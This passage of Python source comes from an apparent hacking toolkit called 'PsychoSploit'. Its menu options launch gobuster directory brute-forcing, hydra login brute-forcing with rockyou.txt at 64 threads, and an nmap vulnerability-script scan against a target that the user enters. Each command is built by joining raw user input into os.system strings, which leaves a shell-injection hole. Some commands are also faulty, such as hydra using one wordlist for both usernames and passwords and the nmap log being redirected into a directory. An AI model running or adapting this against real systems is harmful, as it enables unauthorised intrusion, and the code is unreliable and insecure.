    print(Style.BRIGHT + Fore.RED + 'Enter The Path To Your Directory Wordlst (medium.txt)')
    WORDLIST = input(Style.BRIGHT + Fore.YELLOW + 'Wordlist: ')
    time.sleep(3)
    print(Style.BRIGHT + Fore.RED + 'Enter The Link Of The Website You Want To Use Gobuster On!')
    LINK = input(Style.BRIGHT + Fore.YELLOW + 'LINK: ')
    time.sleep(2)
    print(Style.BRIGHT + Fore.RED + 'Starting The BruteForce...')
    time.sleep(2)
    os.system('gobuster -w ' + WORDLIST + ' -u ' + LINK + ' -x html,php,txt,xml')

elif automate == '5':
    time.sleep(3)
    print(Style.BRIGHT + Fore.RED + 'Getting Hydra Ready...')
    time.sleep(3)
    print(Style.BRIGHT + Fore.RED + 'Enter The Path To Your Wordlst (rockyou.txt)')
    WORDLIST = input(Style.BRIGHT + Fore.YELLOW + 'Wordlist: ')
    time.sleep(3)
    print(Style.BRIGHT + Fore.RED + 'Enter IP')
    IP = input(Style.BRIGHT + Fore.YELLOW + 'IP: ')
    time.sleep(2)
    print(Style.BRIGHT + Fore.RED + 'Enter The Directory You Want To Try TO BruteForce Against For Example http://mysite.com/login.php we would late /login.php and Enter It Below!')
    DIR = input(Style.BRIGHT + Fore.YELLOW + 'Web Directory: ')
    time.sleep(2)
    print(Style.BRIGHT + Fore.RED + 'Starting The BruteForce...')
    time.sleep(2)
    os.system('hydra -L ' + WORDLIST + ' -P ' + WORDLIST + ' -t 64 ' + ' -f ' + IP + ' http-get ' + DIR)
    time.sleep(3)
    os.system('python3 PsychoSploit.py')

elif automate == '6':
    time.sleep(3)
    print('Getting Nmap Ready...')
    time.sleep(3)
    print(Style.BRIGHT + Fore.RED + 'Enter IP')
    IP = input(Style.BRIGHT + Fore.YELLOW + 'IP: ')
    time.sleep(2)
    print('Starting The Scan Once Done All Of The Information Will Be OutPuted Into A .txt File Called nmap.log Located In Your ~/PsychoSploit/Nmap/ Directory!')
    time.sleep(2)
    os.system('nmap -vv -sV --script vuln ' + IP + ' | tee nmap.log > ~/PsychoSploit/Nmap/')
    time.sleep(3)
    os.system('python3 PsychoSploit.py')

elif automate == '7':
    time.sleep(3)
    print('[+] H3r3 1S Y0uR VPN Adr3Ss B0sS!')
    os.system('ifconfig tun0')
    time.sleep(4)
    os.system('python3 PsychoSploit.py')
